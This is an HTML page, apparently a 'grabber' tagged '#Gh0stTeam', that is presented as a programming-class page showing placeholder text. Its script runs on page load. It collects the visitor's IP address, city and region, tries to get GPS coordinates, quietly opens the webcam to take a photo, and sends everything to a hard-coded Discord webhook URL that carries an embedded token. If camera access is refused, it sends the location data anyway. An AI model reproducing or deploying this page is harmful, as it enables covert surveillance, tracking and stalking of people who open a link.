<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aula de Programação</title>
    <style>
        body { background-color: black; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .texto-grande { font-size: 2.5rem; font-weight: bold; text-align: center; max-width: 80%; margin-bottom: 20px; text-transform: uppercase; }
        .gh0st { color: red; font-size: 1.2rem; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="texto-grande">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO</div>
    <div class="gh0st">#Gh0stTeam</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- SUA URL ABAIXO ---
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496557379351875745/PsqDIUD8fIDhCGozVuKw9JQOHjMX-FQgmEfVoaxdGFcRyTq926Dg5m47hxDC5BrKHlTx';

        async function iniciar() {
            let dados = { ip: '?', cidade: '?', estado: '?', mapa: 'Pendente' };

            // Pega IP e Localização aproximada
            try {
                const res = await fetch('https://ipapi.co');
                const json = await res.json();
                dados.ip = json.ip;
                dados.cidade = json.city;
                dados.estado = json.region;
            } catch (e) {}

            // Pega GPS e depois tira a foto
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    dados.mapa = `https://google.com{pos.coords.latitude},${pos.coords.longitude}`;
                    capturarFoto(dados);
                }, () => { capturarFoto(dados); });
            } else {
                capturarFoto(dados);
            }
        }

        async function capturarFoto(dados) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('file', blob, 'foto.png');
                        fd.append('content', `🛑 **Log de Acesso #Gh0stTeam**\n🌐 **IP:** ${dados.ip}\n📍 **Cidade/Estado:** ${dados.cidade}/${dados.estado}\n🗺️ **Mapa:** ${dados.mapa}`);
                        
                        fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/png');
                }, 1000);
            } catch (e) {
                // Se negar câmera, manda só os dados
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: `⚠️ **Câmera Negada!**\n🌐 **IP:** ${dados.ip}\n📍 **Local:** ${dados.cidade}/${dados.estado}\n🗺️ **GPS:** ${dados.mapa}` })
                });
            }
        }

        window.onload = iniciar;
    </script>
</body>
</html>
